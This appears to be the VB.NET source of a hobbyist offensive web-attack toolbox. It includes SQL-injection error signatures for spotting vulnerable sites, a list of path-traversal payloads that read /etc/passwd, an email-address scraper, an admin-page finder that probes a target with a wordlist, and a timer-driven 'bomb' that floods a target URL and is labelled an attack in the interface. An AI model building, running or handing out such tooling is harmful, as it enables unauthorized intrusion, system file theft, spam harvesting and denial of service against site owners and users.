        Me.sqlerrlist.Items.Add("FetchRow()")
        Me.sqlerrlist.Items.Add("Input string was not in a correct format")
        Me.sqlerrlist.Items.Add("There was an error querying the database")
        Me.sqlerrlist.Items.Add("[SQLServer JDBC Driver]")
        Me.sqlerrlist.Items.Add("this page cannot be displayed")
        Me.sqlerrlist.Items.Add("fetch_row")
        Me.sqlerrlist.Items.Add("DatbaseQueryException")
        Me.sqlerrlist.Items.Add("coldfusion.tagext")
        Me.sqlerrlist.Items.Add("error in your SQL syntax") 'ORDER BY 69--
        Me.sqlerrlist.Items.Add("mysql_result(") 'google sql errors noob lol
        Me.sqlerrlist.Items.Add("supplied argument is not a valid MySQL result")
        Me.sqlerrlist.Items.Add("mysql_fetch_array")
        Me.sqlerrlist.Items.Add("sql_numrows(")
        Me.sqlerrlist.Items.Add("call to undefined function")
        Me.sqlerrlist.Items.Add("mysql_result(")
        Me.sqlerrlist.Items.Add("supplied argument is not a valid MySQL result")
        Me.sqlerrlist.Items.Add("mysql_fetch_array")
        Me.sqlerrlist.Items.Add("sql_numrows(")
        Me.sqlerrlist.Items.Add("fetchrow(")
        Me.sqlerrlist.Items.Add("][ODBC Socket]")
        Me.sqlerrlist.Items.Add("][ODBC")
        Me.sqlerrlist.Items.Add("Error Executing Database Query")
        Me.sqlerrlist.Items.Add("SequeLink JDBC Driver")
        Me.sqlerrlist.Items.Add("Microsoft OLE DB")
        Me.sqlerrlist.Items.Add("error '80040e14'")
        Me.sqlerrlist.Items.Add("Provider for ODBC Drivers")
        Me.sqlerrlist.Items.Add("java.sql.SQLException")
        Me.sqlerrlist.Items.Add("VENDORERRORCODE")
        Me.sqlerrlist.Items.Add("</CFQUERY>")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime error '800a000d'")
        Me.sqlerrlist.Items.Add("Type mismatch:")
        Me.sqlerrlist.Items.Add("error '800a000d'")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime")
        Me.sqlerrlist.Items.Add("Microsoft OLE DB Provider for SQL Server")
        Me.sqlerrlist.Items.Add("error '80040e14")
        Me.sqlerrlist.Items.Add("Unclosed quotation mark after the character string")
        Me.sqlerrlist.Items.Add("Type mismatch: '[string: &quot;'37937&quot;]'") 'what the fuck does that mean
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime")
        Me.sqlerrlist.Items.Add("Microsoft VBScript runtime")
        Me.fuzzlist.Items.Add("=../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../../../etc/passwd%00")
        Me.fuzzlist.Items.Add("=../../../../../../../../../../../../../etc/passwd%00")
    End Sub

    Private Sub saver_FileOk(sender As Object, e As CancelEventArgs) Handles saver.FileOk
        Dim streamWriter As StreamWriter = New StreamWriter(Me.saver.FileName)
        Dim arg_25_0 As Integer = 0
        Dim num As Integer = Me.chkdlist.Items.Count - 1
        For i As Integer = arg_25_0 To num
            streamWriter.WriteLine(Me.chkdlist.Items(i).ToString())
        Next
        streamWriter.Close()
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Me.saver.ShowDialog()
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            Dim Request As HttpWebRequest = HttpWebRequest.Create(jogiinurl.Text)
            Request.Proxy = Nothing
            Request.UserAgent = "jogiin86"

            Dim Response As HttpWebResponse = Request.GetResponse
            Dim ResponseStream As System.IO.Stream = Response.GetResponseStream

            Dim StreamReader As New System.IO.StreamReader(ResponseStream)
            Dim Data As String = StreamReader.ReadToEnd
            StreamReader.Close()

            jogiinhttp.Text = Data
        Catch ex As Exception
            MsgBox("Invalid", MsgBoxStyle.Critical)
            jogiinurl.Text = ""
        End Try
    End Sub

    Private Function GetBetweenAll(ByVal Source As String, ByVal Str1 As String, ByVal Str2 As String) As String()
        Dim Results, T As New List(Of String)
        T.AddRange(Regex.Split(Source, Str1))
        T.RemoveAt(0)
        For Each I As String In T
            Results.Add(Regex.Split(I, Str2)(0))
        Next
        Return Results.ToArray
    End Function

    Private Function extract()
        On Error Resume Next
        If (TextBox1.Text.StartsWith("http://") Or TextBox1.Text.StartsWith("https://")) Then
            Dim r As HttpWebRequest = HttpWebRequest.Create(TextBox1.Text)
            r.KeepAlive = True
            r.UserAgent = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36"
            Dim re As HttpWebResponse = r.GetResponse()
            Dim src As String = New StreamReader(re.GetResponseStream()).ReadToEnd()
            Dim words As String() = src.Split(" ")
            For Each word As String In words
                If (word.Contains("@") And word.Contains(".")) Then
                    If (word.Contains("<") And word.Contains(">")) Then
                        Dim toAdd As New List(Of String)
                        Dim noTags As String() = GetBetweenAll(word, ">", "<")
                        For Each w As String In noTags
                            If (w.Contains("@") And w.Contains(".") And Not w.Contains("=")) Then
                                If (w.EndsWith(",") Or w.EndsWith(".")) Then
                                    toAdd.Add(w.Substring(0, w.Length - 1))
                                Else
                                    toAdd.Add(w)
                                End If
                            End If
                        Next
                        If (toAdd.Count > 0) Then
                            If (toAdd.Count > 1) Then
                                For Each t As String In toAdd
                                    jogginemail.Items.Add(t)
                                Next
                            Else
                                jogginemail.Items.Add(toAdd(0))
                            End If
                        End If
                    Else
                        jogginemail.Items.Add(word)
                    End If
                End If
            Next
        Else : MsgBox("That is not a valid link!", MsgBoxStyle.Critical)
        End If
        On Error Resume Next
        'ty pro
    End Function

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Dim trd As Thread = New Thread(AddressOf extract)
        trd.IsBackground = True
        trd.Start()
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Dim items As New List(Of String)
        For Each i As String In jogginemail.Items
            Dim isNew As Boolean = True
            For Each it As String In items
                If (it = i) Then isNew = False
            Next
            If (isNew) Then items.Add(i)
        Next
        jogginemail.Items.Clear()
        For Each i As String In items
            jogginemail.Items.Add(i)
        Next
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        My.Computer.Clipboard.SetText(String.Join(Environment.NewLine, jogginemail.SelectedItems.Cast(Of String).ToArray))
        MsgBox("Copied Email!", MsgBoxStyle.Information)
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        If jogginemail.Items.Count > 0 Then
            MsgBox("Nothing To Clear?", MsgBoxStyle.Critical)
        Else
            jogginemail.Items.Clear()
            MsgBox("Cleared Email(s)!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub w_flinks_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles w_flinks.RunWorkerCompleted
        Me.start1.Enabled = True
        Me.stop1.Enabled = False
        Interaction.MsgBox("Finished", MsgBoxStyle.Information, "Login Page Finder")
        Me.bigfinder.Enabled = True
    End Sub

    Public Sub ListViewMakeRowdata(ByVal lvw As ListView, ByVal item_title As String, ByVal ParamArray subitem_titles As String())
        lvw.BeginInvoke(New ListViewMakeRowdelegate(AddressOf Me.ListViewMakeRowdataInvoke), New Object() {lvw, item_title, subitem_titles})
    End Sub

    Public Sub ListViewMakeRowdataInvoke(ByVal lvw As ListView, ByVal item_title As String, ByVal ParamArray subitem_titles As String())
        Dim item As ListViewItem = lvw.Items.Add(item_title)
        Dim upperBound As Integer = subitem_titles.GetUpperBound(0)
        Dim i As Integer = subitem_titles.GetLowerBound(0)
        Do While (i <= upperBound)
            item.SubItems.Add(subitem_titles(i))
            i += 1
        Loop
    End Sub

    Private Sub lstfsites_SelectedIndexChanged(sender As Object, e As EventArgs) Handles lstfsites.SelectedIndexChanged
        Try
            Process.Start(Me.lstfsites.SelectedItems.Item(0).Text)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Function readresponse(ByVal sqlurl As String) As String
        Dim request As HttpWebRequest = DirectCast(WebRequest.Create(sqlurl), HttpWebRequest)
        request.AllowAutoRedirect = True
        request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Win32)"
        Dim response As HttpWebResponse = DirectCast(request.GetResponse, HttpWebResponse)
        Return Conversions.ToString(CInt(response.StatusCode))
    End Function

    Private Sub w_flinks_ProgressChanged(sender As Object, e As ProgressChangedEventArgs) Handles w_flinks.ProgressChanged
        Me.StatusStrip1.Items.Item(0).Text = ("Requesting : " & Me.trysite)
    End Sub

    Private Sub w_flinks_DoWork(sender As Object, e As DoWorkEventArgs) Handles w_flinks.DoWork
        Dim reader As New StreamReader((AppDomain.CurrentDomain.BaseDirectory & "\admin.txt"))
        Do While (reader.Peek > -1)
            Try
                If Me.w_flinks.CancellationPending Then
                    Exit Do
                End If
                Dim str As String = reader.ReadLine
                Me.w_flinks.ReportProgress(0)
                Me.trysite = (Me.target & str)
                Dim str2 As String = Me.readresponse(Me.trysite)
                Me.ListViewMakeRowdata(Me.lstfsites, (Me.target & str), New String() {str2})
                Continue Do
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                If Not Information.Err.Description.Contains("404") Then
                    If (((((Information.Err.Description.Contains("500") Or Information.Err.Description.Contains("501")) Or Information.Err.Description.Contains("502")) Or Information.Err.Description.Contains("503")) Or Information.Err.Description.Contains("504")) Or Information.Err.Description.Contains("505")) Then
                        Interaction.MsgBox(Information.Err.Description, MsgBoxStyle.Information, "Login Page Finder")
                        ProjectData.ClearProjectError()
                        Exit Do
                    End If
                    Information.Err.Description = Strings.Replace(Information.Err.Description, "The remote server returned an error:", Strings.Space(1), 1, -1, CompareMethod.Binary)
                    Me.ListViewMakeRowdata(Me.lstfsites, Me.trysite, New String() {Information.Err.Description})
                End If
                ProjectData.ClearProjectError()
                Continue Do
            End Try
        Loop
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles start1.Click
        Me.start1.Enabled = False
        Me.stop1.Enabled = True
        Me.bigfinder.Enabled = False

        If (Me.bigfinder.Text.Substring((Me.bigfinder.Text.Length - 1)) <> "/") Then
            Me.bigfinder.Text = (Me.bigfinder.Text & "/")
        End If
        Me.target = Me.bigfinder.Text
        Me.w_flinks = New BackgroundWorker
        If Not Me.w_flinks.IsBusy Then
            Me.w_flinks.WorkerSupportsCancellation = True
            Me.w_flinks.WorkerReportsProgress = True
            AddHandler Me.w_flinks.DoWork, New DoWorkEventHandler(AddressOf Me.w_flinks_DoWork)
            AddHandler Me.w_flinks.RunWorkerCompleted, New RunWorkerCompletedEventHandler(AddressOf Me.w_flinks_RunWorkerCompleted)
            AddHandler Me.w_flinks.ProgressChanged, New ProgressChangedEventHandler(AddressOf Me.w_flinks_ProgressChanged)

            Me.w_flinks.RunWorkerAsync()
        End If
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        If Me.w_flinks.IsBusy Then
            Me.w_flinks.CancelAsync()
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged

    End Sub

    Private Sub checker_Tick(sender As Object, e As EventArgs) Handles checker.Tick
        If CheckBox2.Checked = True Then
            joggintime.Stop()
        Else
            joggintime.Start()
        End If
    End Sub
    <DllImport("urlmon.dll", CharSet:=CharSet.Ansi)>
    Private Shared Function UrlMkSetSessionOption(ByVal dwOption As Integer, ByVal pBuffer As String, ByVal dwBufferLength As Integer, ByVal dwReserved As Integer) As Integer
    End Function
    Const URLMON_OPTION_USERAGENT As Integer = &H10000001
    Public Function ChangeUserAgent(ByVal Agent As String)
        UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, Agent, Agent.Length, 0)
    End Function

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged

    End Sub

    Private Sub Button12_Click_1(sender As Object, e As EventArgs) Handles Button12.Click
        If bomburl.Text = "" Then
            MsgBox("Null!", MsgBoxStyle.Critical)
        Else
            Timer3.Start()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If CheckBox3.Checked = True Then
            ChangeUserAgent("Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1")
            WebBrowser1.Navigate(bomburl.Text)
            WebBrowser2.Navigate(bomburl.Text)
            WebBrowser3.Navigate(bomburl.Text)
            WebBrowser4.Navigate(bomburl.Text)

            WebBrowser1.Refresh()
            WebBrowser2.Refresh()
            WebBrowser3.Refresh()
            WebBrowser4.Refresh()
        Else
            MsgBox("Runtime Error!", MsgBoxStyle.Critical)
            Application.Exit()
        End If
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        TrackBar1.Value = Label9.Text
        Label9.Text = Timer4.Interval
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        If CheckBox3.Checked = True Then
            Timer2.Start()
            Timer3.Stop()
        Else
            Timer4.Start()
            Timer3.Stop()
        End If
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        If Timer4.Enabled = True Or Timer2.Enabled = True Then
            Timer4.Stop()
            Timer2.Stop()
            MsgBox("Stopped Attack To" + " " + (bomburl.Text), MsgBoxStyle.Information)
        Else
            MsgBox("Attack Not Running!", MsgBoxStyle.Critical)
        End If
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        WebBrowser1.Navigate(bomburl.Text)
        WebBrowser2.Navigate(bomburl.Text)
        WebBrowser3.Navigate(bomburl.Text)
        WebBrowser4.Navigate(bomburl.Text)
        WebBrowser1.Refresh()
        WebBrowser2.Refresh()
        WebBrowser3.Refresh()
        WebBrowser4.Refresh()
    End Sub
End Class